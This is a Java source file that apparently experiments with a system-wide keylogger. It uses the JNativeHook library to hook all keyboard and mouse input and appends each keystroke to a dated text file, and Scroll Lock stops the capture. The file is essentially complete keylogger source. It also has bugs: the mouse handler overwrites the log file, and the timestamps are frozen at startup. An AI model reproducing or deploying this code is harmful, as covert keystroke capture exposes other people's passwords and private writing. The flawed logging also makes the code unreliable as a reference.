package testes;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseListener;

public class NovoClass6 implements NativeKeyListener, NativeMouseListener {

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new NovoClass6());
        GlobalScreen.addNativeMouseListener(new NovoClass6());
    }

    boolean clicar;
    boolean teclou;

    Date data = new Date();
    SimpleDateFormat fd = new SimpleDateFormat("dd-MM-yyyy");
    String fdd = fd.format(data);
    Date hora = new Date();
    SimpleDateFormat fh = new SimpleDateFormat("HH:mm:ss");
    String fhh = fh.format(hora);

    public void nativeKeyPressed(NativeKeyEvent nke) {

        String dados = NativeKeyEvent.getKeyText(nke.getKeyCode());

        //try (BufferedWriter arquivo = new BufferedWriter(new FileWriter(fdd + ".txt", true))) {
        try(PrintWriter gravarArq = new PrintWriter(new FileWriter(fdd + ".txt", true))){
            if (clicar == true || teclou == true) {
            }
            if (nke.getKeyCode() == NativeKeyEvent.VC_SCROLL_LOCK) {
                try {
                    GlobalScreen.unregisterNativeHook();
                } catch (NativeHookException ex) {
                    JOptionPane.showMessageDialog(null, ex.getMessage());
                }
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_ENTER) {
                gravarArq.println("\n");
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK) {
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SPACE) {
                gravarArq.printf(" ");
            } else if (true) {
                gravarArq.printf(dados);
                gravarArq.flush();
                teclou = false;
            }
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(null, ex.getMessage());
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
    }

    public void nativeMouseClicked(NativeMouseEvent nme) {
        try {
            BufferedWriter writer = new BufferedWriter(new FileWriter(new File(fdd + ".txt")));
            writer.newLine();
            writer.write(fhh);
            writer.newLine();
            writer.flush();
        } catch (IOException ex) {
            System.out.println(ex.getMessage());
        }
        clicar = true;
    }

    @Override
    public void nativeMousePressed(NativeMouseEvent nme) {
    }

    @Override
    public void nativeMouseReleased(NativeMouseEvent nme) {
    }

}